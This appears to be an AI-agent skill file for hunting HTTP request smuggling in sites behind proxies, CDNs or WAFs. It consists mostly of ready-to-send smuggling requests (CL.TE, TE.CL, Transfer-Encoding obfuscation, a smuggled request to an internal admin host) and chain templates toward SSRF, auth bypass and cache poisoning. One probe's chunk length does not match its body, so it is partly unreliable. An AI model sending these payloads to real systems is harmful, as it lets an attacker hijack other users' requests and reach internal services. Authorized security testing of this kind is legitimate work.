---
name: hunt-http-smuggling
description: "Hunting skill for HTTP Request Smuggling vulnerabilities. CL.TE, TE.CL, TE.TE via Transfer-Encoding chunked parsing confusion between front-end and back-end. Use when testing targets behind a reverse proxy (CDN, load balancer, WAF)."
---

# Hunt: HTTP Request Smuggling

## Detection

### TE.CL (front-end uses TE, back-end uses CL)
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1a
X
0

```
### CL.TE (front-end uses CL, back-end uses TE)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### TE.TE (same header, different parsing)
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding : chunked
```
Position in header list affects how each parser sees it.

## Impact Confirmation

### Smuggle to Poison Next Request
```
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-admin
X-Ignore: X
```
If smuggling works, the next user's request is prepended with smuggled request → attacker controls what next user receives.

## Confirmation Gates
- Timing differential between smuggled vs normal requests → provisional
- Smuggled prefix appended to next response → confirmed + critical
- WAF bypass via smuggled payload → confirmed + critical

## Chain Templates
- HTTP Smuggling + Admin SSRF → smuggle request to internal services
- HTTP Smuggling + Auth Bypass → smuggle requests as different user (access internal-only paths via smuggled Host header)
- HTTP Smuggling + Cache Poisoning → smuggle malicious response into cache
